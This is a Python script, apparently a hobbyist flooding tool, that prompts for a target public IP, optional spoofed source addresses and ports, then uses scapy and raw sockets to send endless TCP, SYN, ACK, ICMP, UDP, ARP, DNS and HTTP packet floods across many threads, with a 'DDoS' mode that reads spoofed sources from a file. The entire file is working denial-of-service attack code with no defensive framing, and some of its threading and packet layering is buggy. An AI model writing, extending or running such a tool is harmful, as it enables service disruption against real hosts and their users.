import os
import sys
import threading

try:
    from scapy.layers.dns import DNS
    from scapy.layers.http import HTTP
    from scapy.layers.inet import TCP, IP, ICMP, UDP, whois
    from scapy.layers.l2 import Ether, ARP
    from scapy.sendrecv import send
    from scapy.packet import Raw
except ImportError:
    if sys.platform.startswith("win"):
        os.system("python -m pip install scapy")
    elif sys.platform.startswith("linux") or sys.platform.startswith("termux"):
        os.system("python3 -m pip install scapy")
    try:
        from scapy.layers.dns import DNS
        from scapy.packet import Raw
        from scapy.layers.http import HTTP
        from scapy.layers.inet import TCP, IP, ICMP, UDP
        from scapy.layers.l2 import Ether, ARP
        from scapy.sendrecv import send
    except ImportError:
        print("Can't install scapy")
        exit()


try:
    import socket
except ImportError:
    if sys.platform.startswith("win"):
        os.system("python -m pip install sockets")
    elif sys.platform.startswith("linux") or sys.platform.startswith("termux"):
        os.system("python3 -m pip install sockets")
    try:
        import socket
    except ImportError:
        print("Can't install socket")
        exit()


try:
    import dns.resolver, dns.reversename
except ImportError:
    if sys.platform.startswith("win"):
        os.system("python -m pip install dnspython")
    elif sys.platform.startswith("linux") or sys.platform.startswith("termux"):
        os.system("python3 -m pip install dnspython")
    try:
        import dns.resolver, dns.reversename
    except ImportError:
        print("Can't install dnspython lib")
        exit()

try:
    import requests
except ImportError:
    if sys.platform.startswith("win"):
        os.system("python -m pip install requests")
    elif sys.platform.startswith("linux") or sys.platform.startswith("termux"):
        os.system("python3 -m pip install requests")

targetIP = None
dstPort = None
spoofIP = None
threads = None
srcPort = None


# TODO: Add custom bytes (AKA Packet size)
# TODO: Add custom amount of packets to send

def setSrcPort():
    global srcPort
    while True:
        srcPort = input("{+} Source Port (Optional) [Press enter for default port 25]: ")
        if srcPort == "":
            srcPort = 25
            break
        else:
            isInt = False
            try:
                srcPort = int(srcPort)
                isInt = True
            except Exception:
                print("Only numbers!")
            if isInt:
                break


def setThreads():
    global threads
    while True:
        threads = input("{+} Threads (Optional) [Press enter for default threads 100]: ")
        if threads == "":
            threads = 100
            break
        else:
            isInt = False
            try:
                threads = int(threads)
                isInt = True
            except Exception:
                print("Only numbers!")
            if isInt:
                break


def setSpoofIP():
    global spoofIP
    while True:
        spoofIP = input("{+} Spoof src IP (Optional) [Press enter for none]: ")
        if spoofIP == "127.0.0.1":
            print("This wont work the way you want to.")
        else:
            break


def setTargetIP():
    global targetIP
    while True:
        targetIP = input("{+} Target public IP: ")
        if targetIP != "":
            break
        if targetIP == "127.0.0.1":
            print("This is local IP. It may not work.")
            break


def setDstPort():
    global dstPort
    while True:
        dstPort = input("{+} Destination Port (Optional) [Press enter for default port 25]: ")
        if dstPort == "":
            dstPort = 25
            break
        else:
            isInt = False
            try:
                dstPort = int(dstPort)
                isInt = True
            except Exception:
                print("Only numbers!")
            if isInt:
                break


def IPtoDNS():
    try:
        addrs = dns.reversename.from_address(targetIP)
        print("Address: " + str(addrs))
        print("DNS: " + str(dns.resolver.resolve(addrs, "PTR")[0]))
    except Exception:
        print("Unknown host")


def attack(p):
    num = 0
    while True:
        try:
            send(p, verbose=False)
            num += 1
            print(num)
        except KeyboardInterrupt:
            print("CTRL+C detected. Attack stopped.")
            break

def DoS():
    protocols = """
    1 - TCP
    2 - TCP SYN
    3 - TCP ACK
    4 - ICMP
    5 - UDP
    6 - ARP
    7 - DNS
    8 - HTTP
    9 - SOCKET
    10 - All
    """
    print(protocols)
    while True:
        mode = input("{!} Protocol: ")
        b = input("{!} Bytes: ")
        if mode != "":
            works = False
            try:
                mode = int(mode)
                b = bytes(int(b))
                works = True
            except Exception:
                continue
            if works:
                break
    if spoofIP == "":
        ip = requests.get('https://api.ipify.org').text
    else:
        ip = spoofIP
    if mode == 1:
        tcp = Ether() / IP(dst=targetIP, src=ip) / TCP(dport=dstPort, sport=srcPort) / Raw(load=b)
        attack(tcp)
    elif mode == 2:
        tcpSYN = Ether() / IP(dst=targetIP, src=ip) / TCP(dport=dstPort, sport=srcPort, flags='S') / Raw(load=b)
        attack(tcpSYN)
    elif mode == 3:
        tcpACK = Ether() / IP(dst=targetIP, src=ip) / TCP(dport=dstPort, sport=srcPort, flags='A') / Raw(load=b)
        attack(tcpACK)
    elif mode == 4:
        icmp = Ether() / IP(dst=targetIP, src=ip) / ICMP() / Raw(load=b)
        attack(icmp)
    elif mode == 5:
        udp = Ether() / IP(dst=targetIP, src=ip) / UDP(dport=dstPort, sport=srcPort) / Raw(load=b)
        attack(udp)
    elif mode == 6:
        arp = Ether() / IP(dst=targetIP, src=ip) / ARP() / Raw(load=b)
        attack(arp)
    elif mode == 7:
        dns = Ether() / IP(dst=targetIP, src=ip) / DNS() / Raw(load=b)
        attack(dns)
    elif mode == 8:
        http = Ether() / IP(dst=targetIP, src=ip) / HTTP() / Raw(load=b)
        attack(http)
    elif mode == 9:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        num = 0
        while True:
            try:
                sock.sendto(b, (targetIP, dstPort))
                num += 1
                print(num)
            except KeyboardInterrupt:
                print("CTRL+C detected. Attack stopped.")
                break
    elif mode == 10:
        http = Ether() / IP(dst=targetIP, src=ip) / HTTP() / Raw(load=b)
        dns = Ether() / IP(dst=targetIP, src=ip) / DNS() / Raw(load=b)
        arp = Ether() / IP(dst=targetIP, src=ip) / ARP() / Raw(load=b)
        udp = Ether() / IP(dst=targetIP, src=ip) / UDP(dport=dstPort, sport=srcPort) / Raw(load=b)
        icmp = Ether() / IP(dst=targetIP, src=ip) / ICMP() / Raw(load=b)
        tcpACK = Ether() / IP(dst=targetIP, src=ip) / TCP(dport=dstPort, sport=srcPort, flags='A') / Raw(load=b)
        tcpSYN = Ether() / IP(dst=targetIP, src=ip) / TCP(dport=dstPort, sport=srcPort, flags='S') / Raw(load=b)
        tcp = Ether() / IP(dst=targetIP, src=ip) / TCP(dport=dstPort, sport=srcPort) / Raw(load=b)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        num = 0
        while True:
            try:
                send(tcp, verbose=False)
                send(tcpSYN, verbose=False)
                send(tcpACK, verbose=False)
                send(icmp, verbose=False)
                send(udp, verbose=False)
                send(arp, verbose=False)
                send(dns, verbose=False)
                send(http, verbose=False)
                sock.sendto(b, (targetIP, dstPort))
                num += 1
                print(num)
            except KeyboardInterrupt:
                print("CTRL+C detected. Attack stopped.")
                break


def DDoS():
    while True:
        fileName = input("{?} Enter the name of the file with proxies (example: text.txt or D:/folder_name/text.txt): ")
        works = False
        try:
            file = open(fileName, "rt")
            works = True
        except Exception:
            print("That file doesn't exist")
        if works:
            break
    lines = []
    for line in file:
        if "\n" in line:
            line = line.replace("\n", "")
        lines.append(line)
    protocols = """
            1 - TCP
            2 - TCP SYN
            3 - TCP ACK
            4 - ICMP
            5 - UDP
            6 - ARP
            7 - DNS
            8 - HTTP
            9 - SOCKET
            10 - All
            """
    print(protocols)
    while True:
        mode = input("{!} Protocol: ")
        b = input("{!} Bytes: ")
        if mode != "":
            works = False
            try:
                mode = int(mode)
                b = bytes(int(b))
                works = True
            except Exception:
                continue
            if works:
                break
    if mode == 1:
        for ip in lines:
            tcp = Ether() / IP(dst=targetIP, src=ip) / TCP(dport=dstPort, sport=srcPort) / Raw(load=b)
            attack(tcp)
    elif mode == 2:
        for ip in lines:
            tcpSYN = Ether() / IP(dst=targetIP, src=ip) / TCP(dport=dstPort, sport=srcPort, flags='S') / Raw(load=b)
            attack(tcpSYN)
    elif mode == 3:
        for ip in lines:
            tcpACK = Ether() / IP(dst=targetIP, src=ip) / TCP(dport=dstPort, sport=srcPort, flags='A') / Raw(load=b)
            attack(tcpACK)
    elif mode == 4:
        for ip in lines:
            icmp = Ether() / IP(dst=targetIP, src=ip) / ICMP() / Raw(load=b)
            attack(icmp)
    elif mode == 5:
        for ip in lines:
            udp = Ether() / IP(dst=targetIP, src=ip) / UDP(dport=dstPort, sport=srcPort) / Raw(load=b)
            attack(udp)
    elif mode == 6:
        for ip in lines:
            arp = Ether() / IP(dst=targetIP, src=ip) / ARP() / Raw(load=b)
            attack(arp)
    elif mode == 7:
        for ip in lines:
            dns = Ether() / IP(dst=targetIP, src=ip) / DNS() / Raw(load=b)
            attack(dns)
    elif mode == 8:
        for ip in lines:
            http = Ether() / IP(dst=targetIP, src=ip) / HTTP() / Raw(load=b)
            attack(http)
    elif mode == 9:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        num = 0
        while True:
            try:
                sock.sendto(b, (targetIP, dstPort))
                num += 1
                print(num)
            except KeyboardInterrupt:
                print("CTRL+C detected. Attack stopped.")
                break
    elif mode == 10:
        num = 0
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            try:
                for ip in lines:
                    http = Ether() / IP(dst=targetIP, src=ip) / HTTP() / Raw(load=b)
                    dns = Ether() / IP(dst=targetIP, src=ip) / DNS() / Raw(load=b)
                    arp = Ether() / IP(dst=targetIP, src=ip) / ARP() / Raw(load=b)
                    udp = Ether() / IP(dst=targetIP, src=ip) / UDP(dport=dstPort, sport=srcPort) / Raw(load=b)
                    icmp = Ether() / IP(dst=targetIP, src=ip) / ICMP() / Raw(load=b)
                    tcpACK = Ether() / IP(dst=targetIP, src=ip) / TCP(dport=dstPort, sport=srcPort,
                                                                      flags='A') / Raw(load=b)
                    tcpSYN = Ether() / IP(dst=targetIP, src=ip) / TCP(dport=dstPort, sport=srcPort,
                                                                      flags='S') / Raw(load=b)
                    tcp = Ether() / IP(dst=targetIP, src=ip) / TCP(dport=dstPort, sport=srcPort) / Raw(load=b)
                    send(tcp, verbose=False)
                    send(tcpSYN, verbose=False)
                    send(tcpACK, verbose=False)
                    send(icmp, verbose=False)
                    send(udp, verbose=False)
                    send(arp, verbose=False)
                    send(dns, verbose=False)
                    send(http, verbose=False)
                    sock.sendto(b, (targetIP, dstPort))
                    num += 1
                    print(num)
            except KeyboardInterrupt:
                print("CTRL+C detected. Attack stopped.")
                break

setTargetIP()
setSpoofIP()
setSrcPort()
setDstPort()
setThreads()


def Menu():
    menu = f"""
        target: {targetIP}
        spoofed src IP: {spoofIP}
        dst port: {dstPort}
        src port: {srcPort}
        threads: {threads}
        
        1 - DDoS
        2 - DoS
        3 - IP to Domain
        4 - Change targetIP
        5 - Change dst port
        6 - Change spoof src IP
        7 - Change threads
        8 - Change src port
        9 - target lookup whois
        """
    print(menu)


Menu()

while True:
    mode = input(" {?} What do you choose: ")
    if mode == "":
        continue
    if mode == "help":
        Menu()
        continue
    working = False
    try:
        mode = int(mode)
        working = True
    except Exception:
        print("Only numbers!")

    if working:
        if mode == 1:
            for t in range(threads):
                threading.Thread(target=DDoS()).start()
        elif mode == 2:
            for t in range(threads):
                threading.Thread(target=DoS()).start()
        elif mode == 3:
            IPtoDNS()
        elif mode == 4:
            setTargetIP()
        elif mode == 5:
            setDstPort()
        elif mode == 6:
            setSpoofIP()
        elif mode == 7:
            setThreads()
        elif mode == 8:
            setSrcPort()
        elif mode == 9:
            while True:
                ip = input("{?} IP: ")
                if ip != "":
                    break
            print(whois(ip))
